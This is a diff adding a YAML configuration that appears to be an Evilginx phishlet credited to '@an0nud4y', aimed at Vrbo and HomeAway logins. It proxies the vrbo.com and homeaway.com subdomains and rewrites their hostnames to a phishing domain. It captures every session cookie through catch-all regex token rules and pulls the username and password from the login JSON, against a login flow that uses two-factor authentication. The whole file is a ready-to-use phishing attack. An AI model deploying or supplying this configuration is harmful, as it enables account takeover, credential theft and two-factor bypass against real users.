@@ -1,0 +1,51 @@
+author: '@an0nud4y'
+min_ver: '2.3.0'
+
+proxy_hosts:
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'vrbo.com', session: true, is_landing: true, auto_filter: false}
+  - {phish_sub: 'csvcus', orig_sub: 'csvcus', domain: 'homeaway.com', session: false, is_landing: false, auto_filter: false}
+  - {phish_sub: 'tmcdn', orig_sub: 'tmcdn', domain: 'homeaway.com', session: true, is_landing: false, auto_filter: false}
+
+sub_filters:
+  - {triggers_on: 'www.vrbo.com', orig_sub: 'www', domain: 'vrbo.com', search: 'www.vrbo.com', replace: 'www.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'www.vrbo.com', orig_sub: 'www', domain: 'vrbo.com', search: 'csvcus.homeaway.com', replace: 'csvcus.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'www.vrbo.com', orig_sub: 'www', domain: 'vrbo.com', search: 'tmcdn.homeaway.com', replace: 'tmcdn.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  
+  - {triggers_on: 'csvcus.homeaway.com', orig_sub: 'csvcus', domain: 'homeaway.com', search: 'www.vrbo.com', replace: 'www.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'csvcus.homeaway.com', orig_sub: 'csvcus', domain: 'homeaway.com', search: 'csvcus.homeaway.com', replace: 'csvcus.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'csvcus.homeaway.com', orig_sub: 'csvcus', domain: 'homeaway.com', search: 'tmcdn.homeaway.com', replace: 'tmcdn.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  
+  - {triggers_on: 'tmcdn.homeaway.com', orig_sub: 'tmcdn', domain: 'homeaway.com', search: 'www.vrbo.com', replace: 'www.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'tmcdn.homeaway.com', orig_sub: 'tmcdn', domain: 'homeaway.com', search: 'csvcus.homeaway.com', replace: 'csvcus.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'tmcdn.homeaway.com', orig_sub: 'tmcdn', domain: 'homeaway.com', search: 'tmcdn.homeaway.com', replace: 'tmcdn.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  
+auth_tokens:
+  - domain: '.vrbo.com'
+    keys: ['.*,regexp']
+  - domain: 'csvcus.homeaway.com'
+    keys: ['.*,regexp']
+  - domain: '.csvcus.homeaway.com'
+    keys: ['.*,regexp']
+  - domain: '.www.vrbo.com'
+    keys: ['.*,regexp']
+  - domain: 'www.vrbo.com'
+    keys: ['.*,regexp']
+  - domain: 'tmcdn.homeaway.com'
+    keys: ['.*,regexp']
+
+auth_urls:
+  - '/*'
+  - '/'
+credentials:
+  username:
+    key: ''
+    search: '"userName":"([^"]*)'
+    type: 'json'
+  password:
+    key: ''
+    search: '"secret":"([^"]*)'
+    type: 'json'
+
+login:
+  domain: 'www.vrbo.com'
+  path: '/auth/ui/login?service=https%3A%2F%2Fwww.vrbo.com%2Fp%2Fhome%2Fvalidate-ticket%3Forigin%3D%252Fp%252Fhome%26site%3Dvrbo&screen=login&treatment=2fa'
